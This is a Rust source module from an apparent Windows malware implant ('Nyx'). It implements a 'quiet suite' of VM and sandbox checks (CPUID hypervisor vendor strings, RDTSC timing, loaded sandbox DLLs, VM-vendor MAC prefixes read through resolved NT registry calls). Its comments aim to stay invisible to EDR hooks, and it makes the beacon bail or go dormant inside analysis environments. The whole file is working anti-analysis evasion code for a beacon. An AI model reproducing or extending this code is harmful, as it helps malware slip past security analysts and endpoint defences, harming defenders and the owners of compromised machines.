//! VM / sandbox / analysis-environment detection — the 5-check "quiet suite"
//! (P0, `EDR_BLINDNESS_UPGRADE_2026-07.md` §2).
//!
//! ## Why this exists
//! Before this module Nyx had ZERO VM/sandbox detection — the only anti-
//! analysis surface was `antidebug.rs` (PEB.BeingDebugged + ProcessDebugPort
//! + GetTickCount64 uptime, the last of which was compiled-out at the call
//! site via `looks_sandboxed(0)`). A 2026 EDR/sandbox's first line of defense
//! is VM detection, so this was Nyx's single biggest blind spot.
//!
//! ## Design — "quiet suite", zero-API-first
//! A noisy VM check is ITSELF an IOC (EDR/AV fingerprint the *act* of
//! probing: `GetAdaptersInfo` + `RegOpenKey("VMware")` + a process snapshot
//! from a fresh process is a textbook malware signature). So the suite is
//! ordered by ascending noise / descending false-positive risk, with the
//! two **pure-instruction** checks (no API, no syscall, no IAT footprint)
//! first. These two alone are invisible to every user-mode hook.
//!
//! ## 2026 critical nuance — VBS/HVCI changes the meaning of the signals
//! `CPUID.01h:ECX[31]` (hypervisor-present bit), the BIOS string
//! `"Microsoft Corporation"`, and RDTSC-CPUID timing deltas **all fire on
//! Win11 bare metal with VBS/HVCI enabled** (default on Win11 24H2+). So:
//!   - NEVER trigger solely on the hypervisor bit or `Microsoft Hv`.
//!   - ALWAYS filter on VM-specific vendor strings (`VMwareVMware`,
//!     `innotek GmbH`, `TCGTCGTCGTCG`, `VBox…`, `KVMKVMKVM`, `XenVMMXenVMM`,
//!     `prl hyperv  `). These are vendor-registered OUIs/signatures that do
//!     not appear on physical hardware.
//!   - Treat RDTSC timing as a CORROBORATOR, not a primary trigger.
//!
//! ## Decision policy
//! `looks_like_analysis_env()` returns true if ANY high-confidence VM-specific
//! signal is present (vendor string match, SbieDll loaded, VM-OUI MAC). The
//! RDTSC timing check is a tie-breaker: if the quiet suite is inconclusive
//! AND timing strongly indicates virtualization, treat the host as suspect.
//! The caller (`entry::bootstrap`) gates beacon execution on this — a positive
//! causes the beacon to bail (or, in a future "dormant" mode, drop to an
//! ultra-low-frequency cycle to defeat sandbox behavior profiling).
//!
//! ## Single-source-of-truth
//! The PEB-walk API resolution lives in [`crate::resolve`]; this module
//! never reimplements it. All Win32/NT calls go through `resolve::export_addr`
//! so there are zero static imports (PIC-clean). `CPUID`/`RDTSC` need no API.

#![cfg(target_os = "windows")]

use crate::resolve;

// ---- (1) CPUID hypervisor vendor string -----------------------------------

/// Known hypervisor vendor signatures from CPUID leaf 0x40000000
/// (EBX:ECX:EDX = 12 ASCII chars). Only VM-vendor-specific signatures are
/// listed — `Microsoft Hv` is deliberately EXCLUDED because VBS/HVCI on
/// physical Win11 hardware reports it (high false-positive rate).
const VM_VENDOR_SIGS: &[[u8; 12]] = &[
    *b"VMwareVMware",  // VMware
    *b"innotek GmbH",  // VirtualBox (older)
    *b"KVMKVMKVM\0\0\0", // KVM
    *b"XenVMMXenVMM",  // Xen
    *b"TCGTCGTCGTCG",  // QEMU without KVM (strong sandbox signal)
    *b"prl hyperv  ",  // Parallels
    *b"VBoxVBoxVBox",  // VirtualBox (alt)
];

/// Read the 12-byte hypervisor vendor signature via CPUID leaf 0x40000000.
/// Returns `None` if the hypervisor-present bit (CPUID.01h:ECX[31]) is clear.
///
/// Pure instruction sequence — no API, no syscall, no IAT footprint. Invisible
/// to user-mode hooks. Ring-3 legal on x86/x64.
fn cpuid_hypervisor_vendor() -> Option<[u8; 12]> {
    // SAFETY: CPUID is a non-privileged, side-effect-free query instruction
    // on x86/x64. `__cpuid` is the safe wrapper over the `cpuid` asm.
    // We use `target_feature` gating so this compiles only on x86_64.
    #[cfg(target_arch = "x86_64")]
    {
        use core::arch::x86_64::__cpuid;
        // Leaf 1: ECX bit 31 = hypervisor present. `__cpuid` is a safe fn.
        let f1 = __cpuid(1);
        if (f1.ecx >> 31) & 1 == 0 {
            return None;
        }
        // Leaf 0x40000000: EBX, ECX, EDX hold the 12-char ASCII signature.
        let b = __cpuid(0x4000_0000);
        let mut sig = [0u8; 12];
        sig[0..4].copy_from_slice(&b.ebx.to_le_bytes());
        sig[4..8].copy_from_slice(&b.ecx.to_le_bytes());
        sig[8..12].copy_from_slice(&b.edx.to_le_bytes());
        Some(sig)
    }
    #[cfg(not(target_arch = "x86_64"))]
    {
        None // non-x86_64: no CPUID hypervisor leaf
    }
}

/// True if the CPUID hypervisor vendor string matches a known VM vendor
/// (excluding `Microsoft Hv` — VBS false positive on physical Win11).
pub fn cpuid_vm_vendor_match() -> bool {
    match cpuid_hypervisor_vendor() {
        None => false,
        Some(sig) => VM_VENDOR_SIGS.iter().any(|k| *k == sig),
    }
}

// ---- (2) RDTSC-CPUID timing ratio (corroborator) --------------------------

/// Measure the CPUID-induced VM-exit overhead relative to an RDTSC baseline.
/// Under virtualization, `CPUID` forces a VM-exit (trap-and-emulate), adding
/// ~1000-10000+ cycles vs ~150-400 on bare metal. Returns true if the timing
/// delta strongly suggests a hypervisor.
///
/// **2026 caveat:** bare-metal VBS/HVCI also traps CPUID, so this is a
/// CORROBORATOR, not a primary trigger. Use only when the quiet suite is
/// inconclusive.
///
/// Pure instructions (`RDTSC` + `CPUID`) — no API, no syscall.
#[cfg(target_arch = "x86_64")]
pub fn rdtsc_cpuid_is_virtualized() -> bool {
    use core::arch::x86_64::{__cpuid, _rdtsc};

    const ITERS: usize = 32;
    const THRESH: u64 = 5; // probe delta > 5× baseline → suspect

    // SAFETY: RDTSC and CPUID are non-privileged query instructions.
    unsafe {
        // Warm up the instruction cache / branch predictor.
        for _ in 0..16 {
            let _ = __cpuid(1);
        }

        // Baseline: two back-to-back RDTSC (no forcing instruction between).
        let mut base_min = u64::MAX;
        for _ in 0..ITERS {
            let t0 = _rdtsc();
            let t1 = _rdtsc();
            let d = t1.wrapping_sub(t0);
            if d < base_min {
                base_min = d;
            }
        }

        // Probe: RDTSC → CPUID (forcing instruction) → RDTSC.
        let mut probe_min = u64::MAX;
        for _ in 0..ITERS {
            let t0 = _rdtsc();
            let _ = __cpuid(1);
            let t1 = _rdtsc();
            let d = t1.wrapping_sub(t0);
            if d < probe_min {
                probe_min = d;
            }
        }

        // Guard against a degenerate baseline (e.g. TSC frequency skew).
        if base_min == 0 {
            return probe_min > 1000;
        }
        probe_min > base_min.saturating_mul(THRESH)
    }
}

#[cfg(not(target_arch = "x86_64"))]
pub fn rdtsc_cpuid_is_virtualized() -> bool {
    false
}

// ---- (3) Sandbox-DLL-in-self check (SbieDll etc.) -------------------------

/// DLLs whose presence in the current process indicates a sandbox /
/// instrumentation harness. These only load under their respective harnesses,
/// so the false-positive rate is effectively zero.
const SANDBOX_DLLS: &[&[u8]] = &[
    b"SbieDll.dll\0",          // Sandboxie
    b"api_log.dll\0",          // Sunbelt/GFI sandbox
    b"dir_log.dll\0",          // Sunbelt/GFI sandbox
    b"pstorec.dll\0",          // older sandboxes
    b"vmcheck.dll\0",          // VMware checks
    b"wpespy.dll\0",           // WPE sandbox
    b"sbiedll.dll\0",          // Sandboxie (lowercase variant)
];

/// True if a known sandbox/instrumentation DLL is loaded in the current
/// process. Uses `GetModuleHandleA` (kernel32, already loaded) — one cheap
/// call per DLL, no enumeration. Near-zero noise, zero false-positive.
///
/// # Safety
/// Resolves `GetModuleHandleA` via the PEB walk (read-only). Single-threaded
/// beacon context.
pub unsafe fn sandbox_dll_loaded() -> bool {
    let gma = match unsafe { resolve::export_addr(b"kernel32.dll", b"GetModuleHandleA") } {
        Some(a) => a,
        None => return false,
    };
    type GetModuleHandleA = unsafe extern "system" fn(*const u8) -> *mut core::ffi::c_void;
    let f: GetModuleHandleA = unsafe { core::mem::transmute(gma) };
    for &name in SANDBOX_DLLS {
        // SAFETY: each name is a NUL-terminated byte literal; GetModuleHandleA
        // does not load anything, only queries the already-loaded module list.
        let h = unsafe { f(name.as_ptr()) };
        if !h.is_null() {
            return true;
        }
    }
    false
}

// ---- (4) MAC OUI via registry (NT-direct, no IPHLPAPI load) ---------------

/// VM-vendor NIC OUI prefixes (first 3 bytes of the MAC). These are
/// vendor-registered and do not appear on physical NICs.
const VM_OUI: &[[u8; 6]] = &[
    [0x00, 0x0C, 0x29, 0x00, 0x00, 0x00], // VMware
    [0x00, 0x50, 0x56, 0x00, 0x00, 0x00], // VMware
    [0x00, 0x05, 0x69, 0x00, 0x00, 0x00], // VMware (old)
    [0x08, 0x00, 0x27, 0x00, 0x00, 0x00], // VirtualBox
    [0x00, 0x15, 0x5D, 0x00, 0x00, 0x00], // Hyper-V (VM NIC, not VBS host)
    [0x00, 0x16, 0x3E, 0x00, 0x00, 0x00], // Xen
    [0x52, 0x54, 0x00, 0x00, 0x00, 0x00], // QEMU/KVM default
    [0x00, 0x1C, 0x42, 0x00, 0x00, 0x00], // Parallels
];

/// The ASCII bytes of the registry path for the first NIC's `NetworkAddress`
/// value. Built as a raw byte array (NOT a byte string — `\R`/`\M`/`\S`/`\C`
/// are not valid `b"..."` escapes) so it compiles cleanly. Widened to UTF-16
/// at runtime into a stack buffer (`net_cfg_reg_path_utf16` below).
///
/// Path: `\Registry\Machine\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\0001`
const NET_CFG_REG_PATH_ASCII: &[u8] = b"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318}\\0001";

/// Widen `NET_CFG_REG_PATH_ASCII` into a NUL-terminated UTF-16 stack buffer.
/// Returns the buffer and the char count (excluding NUL). The caller uses
/// this to build the UNICODE_STRING for NtOpenKey.
fn net_cfg_reg_path_utf16() -> ([u16; 128], usize) {
    let mut buf = [0u16; 128];
    let mut n = 0usize;
    for &b in NET_CFG_REG_PATH_ASCII {
        if n + 1 >= buf.len() {
            break;
        }
        buf[n] = b as u16;
        n += 1;
    }
    buf[n] = 0; // NUL terminator
    (buf, n)
}

/// True if the first NIC's MAC address matches a known VM-vendor OUI.
/// Reads the registry `NetworkAddress` value via NT-direct (no IPHLPAPI).
///
/// **2026 caveat:** Hyper-V OUI `00:15:5D` appears on Hyper-V virtual NICs
/// (a genuine VM signal) but NOT on VBS-enabled physical hosts (VBS doesn't
/// add virtual NICs). So this check has a low false-positive rate even on
/// Win11 VBS boxes.
///
/// # Safety
/// Resolves `NtOpenKey` + `NtQueryValueKey` from ntdll via the PEB walk.
pub unsafe fn mac_oui_is_vm() -> bool {
    let nt_open_key = match unsafe { resolve::export_addr(b"ntdll.dll", b"NtOpenKey") } {
        Some(a) => a,
        None => return false,
    };
    let nt_query_value = match unsafe { resolve::export_addr(b"ntdll.dll", b"NtQueryValueKey") } {
        Some(a) => a,
        None => return false,
    };
    let nt_close = match unsafe { resolve::export_addr(b"ntdll.dll", b"NtClose") } {
        Some(a) => a,
        None => return false,
    };
    type NtOpenKey = unsafe extern "system" fn(
        *mut usize,         // KeyHandle OUT
        u32,                // DesiredAccess (KEY_READ = 0x20000)
        *mut ObjectAttributes,
    ) -> i32;
    type NtQueryValueKey = unsafe extern "system" fn(
        usize,              // KeyHandle
        *const UnicodeString, // ValueName
        u8,                 // KeyValueInformationClass (Partial = 2)
        *mut u8,            // KeyValueInformation
        u32,                // Length
        *mut u32,           // ResultLength
    ) -> i32;
    type NtClose = unsafe extern "system" fn(usize) -> i32;

    let open: NtOpenKey = unsafe { core::mem::transmute(nt_open_key) };
    let query: NtQueryValueKey = unsafe { core::mem::transmute(nt_query_value) };
    let close: NtClose = unsafe { core::mem::transmute(nt_close) };

    // Build UNICODE_STRING for the registry path. Widen the ASCII path to
    // UTF-16 on the stack (NtOpenKey takes a UNICODE_STRING, not a C string).
    let (mut path_buf, path_chars) = net_cfg_reg_path_utf16();
    let path_len_bytes = (path_chars * 2) as u16;
    let mut name = UnicodeString {
        length: path_len_bytes,
        maximum_length: (path_buf.len() * 2) as u16,
        buffer: path_buf.as_mut_ptr(),
    };
    let mut oa = ObjectAttributes {
        length: core::mem::size_of::<ObjectAttributes>() as u32,
        root_directory: core::ptr::null_mut(),
        object_name: &mut name,
        attributes: 0x40, // OBJ_CASE_INSENSITIVE — registry paths are case-insensitive
        security_descriptor: core::ptr::null_mut(),
        security_quality_of_service: core::ptr::null_mut(),
    };

    let mut handle: usize = 0;
    let st = unsafe { open(&mut handle, 0x2000_0, &mut oa) };
    if st < 0 {
        return false; // key doesn't exist (no NIC config) — not a VM signal
    }

    // Query the "NetworkAddress" value. Build a UNICODE_STRING for it.
    let mut val_name_buf: [u16; 16] = [
        b'N' as u16, b'e' as u16, b't' as u16, b'w' as u16, b'o' as u16, b'r' as u16,
        b'k' as u16, b'A' as u16, b'd' as u16, b'd' as u16, b'r' as u16, b'e' as u16,
        b's' as u16, b's' as u16, 0, 0,
    ]; // "NetworkAddress\0"
    let val_name = UnicodeString {
        length: 14 * 2, // "NetworkAddress" = 14 chars
        maximum_length: 16 * 2,
        buffer: val_name_buf.as_mut_ptr(),
    };

    // KeyValuePartialInformation: the first 4 bytes are the Type (REG_SZ = 1),
    // then DataLength (u32), then Data. A MAC "NetworkAddress" is a REG_SZ
    // holding the MAC as an ASCII hex string (e.g. "000C291A2B3C").
    let mut info_buf: [u8; 64] = [0; 64];
    let mut result_len: u32 = 0;
    let st = unsafe {
        query(
            handle,
            &val_name,
            2, // KeyValuePartialInformation
            info_buf.as_mut_ptr(),
            info_buf.len() as u32,
            &mut result_len,
        )
    };
    let _ = unsafe { close(handle) };
    if st < 0 {
        return false;
    }

    // Parse: Type @ +0 (u32), DataLength @ +4 (u32), Data @ +8 (hex string).
    // The hex string is ASCII, e.g. b"000C291A2B3C". We only need the first
    // 6 hex chars (3 bytes = OUI). Parse them into a 6-byte raw MAC.
    let data_off = 8usize;
    let mut mac = [0u8; 6];
    let mut parsed = 0usize;
    while parsed < 6 && data_off + parsed + 1 < info_buf.len() {
        let hi = info_buf[data_off + parsed];
        let lo = info_buf[data_off + parsed + 1];
        let h = match hex_val(hi) {
            Some(v) => v,
            None => break,
        };
        let l = match hex_val(lo) {
            Some(v) => v,
            None => break,
        };
        mac[parsed / 2] = (h << 4) | l;
        parsed += 2;
    }
    if parsed < 6 {
        return false; // not enough hex digits — not a MAC
    }

    // Compare the first 3 bytes (OUI) against the VM table.
    VM_OUI.iter().any(|oui| oui[..3] == mac[..3])
}

/// ASCII hex char → nibble value.
const fn hex_val(c: u8) -> Option<u8> {
    match c {
        b'0'..=b'9' => Some(c - b'0'),
        b'a'..=b'f' => Some(c - b'a' + 10),
        b'A'..=b'F' => Some(c - b'A' + 10),
        _ => None,
    }
}

// ---- FFI types for NT registry APIs (mirrors unhook.rs patterns) ----------

#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: *mut core::ffi::c_void,
    object_name: *mut UnicodeString,
    attributes: u32,
    security_descriptor: *mut core::ffi::c_void,
    security_quality_of_service: *mut core::ffi::c_void,
}

// ---- Combined verdict ------------------------------------------------------

/// The confidence level of an environment-probe hit.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum EnvVerdict {
    /// The environment looks like a real endpoint — proceed normally.
    Clean,
    /// A VM-specific signal was detected (high confidence). The beacon should
    /// NOT execute its task loop normally — either bail or go dormant.
    AnalysisEnv,
}

/// Run the 5-check quiet suite and return a combined verdict.
///
/// **Policy:**
/// - ANY high-confidence VM-specific signal (CPUID vendor match, sandbox DLL
///   loaded, VM-OUI MAC) → `AnalysisEnv`. These have near-zero false-positive
///   rates on real endpoints.
/// - If all high-confidence checks are clean but RDTSC timing strongly
///   indicates virtualization → `AnalysisEnv` (corroborator-only path; this
///   catches sandboxes that spoof CPUID/vendor strings).
/// - Otherwise → `Clean`.
///
/// # Safety
/// The MAC-OUI check resolves NT registry APIs via the PEB walk. The other
/// checks are pure-instruction or use already-loaded kernel32. Single-threaded
/// beacon bootstrap context.
pub unsafe fn looks_like_analysis_env() -> EnvVerdict {
    // Tier 1: high-confidence, low-noise checks.
    if cpuid_vm_vendor_match() {
        return EnvVerdict::AnalysisEnv;
    }
    if unsafe { sandbox_dll_loaded() } {
        return EnvVerdict::AnalysisEnv;
    }
    if unsafe { mac_oui_is_vm() } {
        return EnvVerdict::AnalysisEnv;
    }

    // Tier 2: corroborator (RDTSC timing). Only triggers if the quiet suite
    // was inconclusive but timing strongly flags virtualization. This catches
    // sandboxes that hide their CPUID signature / MAC but can't hide VM-exit
    // overhead.
    if rdtsc_cpuid_is_virtualized() {
        return EnvVerdict::AnalysisEnv;
    }

    EnvVerdict::Clean
}

// ---- Selftest entry --------------------------------------------------------

/// `rundll32 nyx_implant_win.dll,nyx_selftest_envprobe` — prints the verdict
/// via the process exit code:
///   0xB0 = Clean (no VM signals detected)
///   0xB1 = AnalysisEnv (VM/sandbox signal detected)
///   0xCF = probe failed (could not resolve APIs)
///
/// Useful for validating the suite against known VM/bare-metal hosts.
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_envprobe() {
    let exit_proc = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess");
    let do_exit = |code: u32| -> ! {
        if let Some(e) = exit_proc {
            let f: extern "system" fn(u32) -> ! = unsafe { core::mem::transmute(e) };
            f(code);
        }
        loop {
            core::hint::spin_loop();
        }
    };
    let verdict = unsafe { looks_like_analysis_env() };
    let code = match verdict {
        EnvVerdict::Clean => 0xB0,
        EnvVerdict::AnalysisEnv => 0xB1,
    };
    do_exit(code);
}
